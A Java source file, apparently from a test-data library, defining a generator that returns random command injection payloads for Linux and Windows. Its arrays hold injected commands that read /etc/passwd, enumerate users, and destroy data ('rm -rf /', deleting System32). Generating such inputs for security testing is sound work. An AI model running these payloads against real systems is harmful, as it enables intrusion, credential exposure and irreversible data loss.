package com.dataforge.generators.security;

import com.dataforge.core.DataGenerator;
import com.dataforge.core.GenerationContext;

import java.util.Random;

/**
 * Command injection payload generator for generating common command injection attacks.
 */
public class CommandInjectionGenerator implements DataGenerator<String> {
    
    // Common command injection payloads
    private static final String[] LINUX_PAYLOADS = {
        "; ls",
        "| ls",
        "& ls",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "& cat /etc/passwd",
        "; id",
        "| id",
        "& id",
        "; whoami",
        "| whoami",
        "& whoami",
        "; rm -rf /",
        "| rm -rf /",
        "& rm -rf /",
        "`ls`",
        "$(ls)",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "`id`",
        "$(id)",
        "`whoami`",
        "$(whoami)"
    };
    
    private static final String[] WINDOWS_PAYLOADS = {
        "& dir",
        "| dir",
        "&& dir",
        "& type C:\\Windows\\win.ini",
        "| type C:\\Windows\\win.ini",
        "&& type C:\\Windows\\win.ini",
        "& ver",
        "| ver",
        "&& ver",
        "& net user",
        "| net user",
        "&& net user",
        "& del C:\\Windows\\System32\\*",
        "| del C:\\Windows\\System32\\*",
        "&& del C:\\Windows\\System32\\*",
        "%OS%",
        "%USERNAME%",
        "%COMPUTERNAME%"
    };
    
    // OS types
    public enum OSType {
        LINUX, WINDOWS, GENERIC
    }
    
    private final OSType osType;
    
    public CommandInjectionGenerator() {
        this(OSType.GENERIC);
    }
    
    public CommandInjectionGenerator(OSType osType) {
        this.osType = osType;
    }
    
    @Override
    public String generate(GenerationContext context) {
        Random random = context.getRandom();
        
        switch (osType) {
            case LINUX:
                return LINUX_PAYLOADS[random.nextInt(LINUX_PAYLOADS.length)];
            case WINDOWS:
                return WINDOWS_PAYLOADS[random.nextInt(WINDOWS_PAYLOADS.length)];
            case GENERIC:
            default:
                // Randomly select between Linux and Windows payloads
                if (random.nextBoolean()) {
                    return LINUX_PAYLOADS[random.nextInt(LINUX_PAYLOADS.length)];
                } else {
                    return WINDOWS_PAYLOADS[random.nextInt(WINDOWS_PAYLOADS.length)];
                }
        }
    }
}